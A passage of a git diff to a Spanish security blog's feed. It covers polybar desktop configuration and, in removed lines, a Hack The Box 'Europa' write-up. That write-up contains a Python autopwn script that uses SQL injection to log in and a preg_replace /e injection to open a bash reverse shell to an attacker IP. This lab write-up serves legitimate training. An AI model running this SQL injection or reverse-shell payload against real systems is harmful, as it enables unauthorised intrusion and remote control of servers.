+label-warn-foreground &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;colors&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.secondary&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+
+ramp-0 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 
+ramp-1 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 
+ramp-2 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 
+ramp-foreground &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;colors&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.foreground-alt&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;module/powermenu]
+&lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; custom/menu
+
+expand-right &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true
+
+&lt;/span&gt;format-spacing &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1
+
+label-open &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 
+label-open-foreground &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;colors&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.secondary&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+label-close &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  cancel
+label-close-foreground &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;colors&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.secondary&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+label-separator &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; |
+label-separator-foreground &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;colors&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.foreground-alt&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+
+menu-0-0 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; reboot
+menu-0-0-exec &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; menu-open-1
+menu-0-1 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; power off
+menu-0-1-exec &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; menu-open-2
+
+menu-1-0 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; cancel
+menu-1-0-exec &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; menu-open-0
+menu-1-1 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; reboot
+menu-1-1-exec &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;reboot
+
+menu-2-0 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; power off
+menu-2-0-exec &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;poweroff
+menu-2-1 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; cancel
+menu-2-1-exec &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; menu-open-0
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;settings]
+screenchange-reload &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;compositing-background &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; xor
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;compositing-background &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; screen
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;compositing-foreground &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;source&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;compositing-border &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; over
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;pseudo-transparency &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;global/wm]
+margin-top &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 5
+margin-bottom &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 5
+
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; vim:ft&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dosini
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;module/wlanpolybar]
+&lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; custom/script
+interval &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 2
+&lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ~/.config/bin/wlan_status.sh
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;module/vpn]
+&lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; custom/script
+interval &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 2
+&lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ~/.config/bin/vpn_status.sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;¡Espero que de esta forma tengáis menos problemas!&lt;/p&gt;</content><author><name>Jflabur</name><email>s4vipriv@gmail.com</email></author><category term="YouTube" /><category term="Utilidades" /><category term="Configuración" /><category term="Bspwm" /><category term="Sxhkd" /><category term="Compton" /><category term="Polybar" /><category term="Powerlevel10k" /><summary type="html">En este artículo comparto algunos de mis archivos para 'Configurar un buen entorno de trabajo en Linux' .</summary></entry><entry><title type="html">Cómo construir tu propio sistema Linux</title><link href="http://localhost:4000/como-crear-un-sistema-linux/" rel="alternate" type="text/html" title="Cómo construir tu propio sistema Linux" /><published>2020-04-23T00:00:00+02:00</published><updated>2020-04-23T00:00:00+02:00</updated><id>http://localhost:4000/como-crear-un-sistema-linux</id><content type="html" xml:base="http://localhost:4000/como-crear-un-sistema-linux/">&lt;h1 id=&quot;cómo-construir-tu-propio-sistema-linux-s4vios&quot;&gt;Cómo construir tu propio sistema Linux (S4viOS)&lt;/h1&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://wallpaperaccess.com/full/981849.png&quot; alt=&quot;Portada OS&quot; /&gt;&lt;/p&gt;
 
@@ -151,7 +1150,7 @@ Resolviendo deltas: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;14103/141
       &lt;li&gt;&lt;a href=&quot;#version-check&quot;&gt;Version Check&lt;/a&gt;&lt;/li&gt;
     &lt;/ul&gt;
   &lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#creando-nueva-partición&quot;&gt;Creando nueva partición&lt;/a&gt;
+  &lt;li&gt;&lt;a href=&quot;#creando-nueva-partición&quot;&gt;Creando nueva particion&lt;/a&gt;
     &lt;ul&gt;
       &lt;li&gt;&lt;a href=&quot;#Estructurando-la-partición-con-parted&quot;&gt;Estructurando la partición con parted&lt;/a&gt;&lt;/li&gt;
     &lt;/ul&gt;
@@ -13656,122 +14655,4 @@ Para los interesados, deciros que tenéis la charla disponible en el siguiente e
 
 &lt;p align=&quot;center&quot;&gt;
 &lt;img src=&quot;/assets/images/evil-trust/step_ten.png&quot; /&gt;
-&lt;/p&gt;</content><author><name>Jflabur</name><email>s4vipriv@gmail.com</email></author><category term="Scripting" /><category term="GitHub" /><category term="Bash" /><category term="Herramientas" /><summary type="html">Recientemente estuve en la h-c0n presentando la herramienta evilTrust. En este artículo, comento la utilidad de la herramienta para todos aquellos que la quieran probar. Gracias a los organizadores del evento por invitarme y a todos los presentes por la gran acogida.</summary></entry><entry><title type="html">Europa - Hack The Box</title><link href="http://localhost:4000/europa-hackthebox/" rel="alternate" type="text/html" title="Europa - Hack The Box" /><published>2020-01-31T00:00:00+01:00</published><updated>2020-01-31T00:00:00+01:00</updated><id>http://localhost:4000/europa-hackthebox</id><content type="html" xml:base="http://localhost:4000/europa-hackthebox/">&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/htb-writeup-europa/europa_logo.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;Una máquina muy interesante la cual resolvemos en mi canal de YouTube. En este caso, os comparto el script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Autopwn&lt;/code&gt; que nos habíamos configurado en Python, donde tras su ejecución se nos automatiza la intrusión y la escalada de privilegios mediante el uso de la librería pwn.&lt;/p&gt;
-
-&lt;p&gt;Para los interesados en la resolución de esta máquina, os dejo el enlace al vídeo que subí a mi canal:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=wOm4OOBLbys&quot;&gt;Máquina Europa - HackTheBox&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;script-autopwn&quot;&gt;Script Autopwn&lt;/h2&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python
-#coding: utf-8
-&lt;/span&gt;
-&lt;span class=&quot;c1&quot;&gt;# Author: s4vitar https://www.youtube.com/watch?v=wOm4OOBLbys
-&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urllib3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;threading&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
-
-&lt;span class=&quot;c1&quot;&gt;# Declaración de variables
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;https://admin-portal.europacorp.htb/login.php&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;url_openvpn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;https://admin-portal.europacorp.htb/tools.php&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;lport&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;443&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SIGINT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SIG_DFL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;obtainShell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
-
- &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
-
- &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;urllib3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;disable_warnings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;verify&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;keep_alive&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;
-
-  &lt;span class=&quot;n&quot;&gt;login_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-   &lt;span class=&quot;s&quot;&gt;'email'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;admin@europacorp.htb' OR '1' = '1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-   &lt;span class=&quot;s&quot;&gt;'password'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'admin'&lt;/span&gt;
-  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-  &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;progress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Login&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Realizando inyección SQL'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-  &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;login_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-  &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Inyección SQL enviada'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Dashboard&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-   &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Inyección SQL realizada con éxito&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-   &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-   &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Acceso al Dashboard garantizado&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-   &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-   &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;failure&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;No ha sido posible realizar la inyección SQL&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-   &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-
-  &lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;progress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Explotación&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Creando un nuevo fichero de configuración VPN&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-  &lt;span class=&quot;n&quot;&gt;openvpn_config_file_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-   &lt;span class=&quot;s&quot;&gt;'pattern'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'/ip_address/e'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-   &lt;span class=&quot;s&quot;&gt;'ipaddress'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;system(&quot;bash -c 'bash -i &amp;gt; /dev/tcp/10.10.14.55/443 0&amp;gt;&amp;amp;1'&quot;)&quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-   &lt;span class=&quot;s&quot;&gt;'text'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'ip_address = s4vitar'&lt;/span&gt;
-  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-  &lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Enviando petición al servidor&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-  &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url_openvpn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;openvpn_config_file_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-  &lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Petición enviada con éxito&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
- &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exceptions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ReadTimeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Petición enviada con éxito&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
- &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[*] Ha ocurrido un error...&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'__main__'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-
- &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;threading&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;obtainShell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
